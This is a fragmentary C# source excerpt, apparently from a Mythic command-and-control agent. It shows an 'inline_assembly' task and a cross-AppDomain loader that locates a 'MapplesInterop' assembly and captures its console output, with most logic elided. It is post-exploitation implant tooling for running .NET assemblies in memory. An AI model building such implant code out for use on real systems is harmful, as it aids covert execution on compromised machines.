...
using MapplesInterop.Classes.IO;
using Task = MapplesInterop.Structs.MythicStructs.Task;
    ...
    public class inline_assembly : Tasking
    {
        ...
        public override void Start()
        {
            ...
            try
            {
                ...
                {
                    resp = CreateTaskResponse("Failed to get MapplesInterop dependency.", true, "error");
                }
            }
            catch (Exception ex)
            {
...
#region Cross AppDomain Loader
        static void ActivateLoader()
        {
            void OnWrite(object sender, object args)
            {
                ...
                {
                    if (asm2.FullName.StartsWith("MapplesInterop"))
                    {
                        interop2 = asm2;
                        break;
                    }
                ...
                Type tStringEventArgs = interop2.GetType("MapplesInterop.Classes.Events.StringDataEventArgs");
            ...
            {
                if (asm.FullName.StartsWith("MapplesInterop"))
                {
                    interopAsm = asm;
                }
            }
            ...
            Type tWriter = interopAsm.GetType("MapplesInterop.Classes.IO.EventableStringWriter");
            ...
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Mapples"))
                {
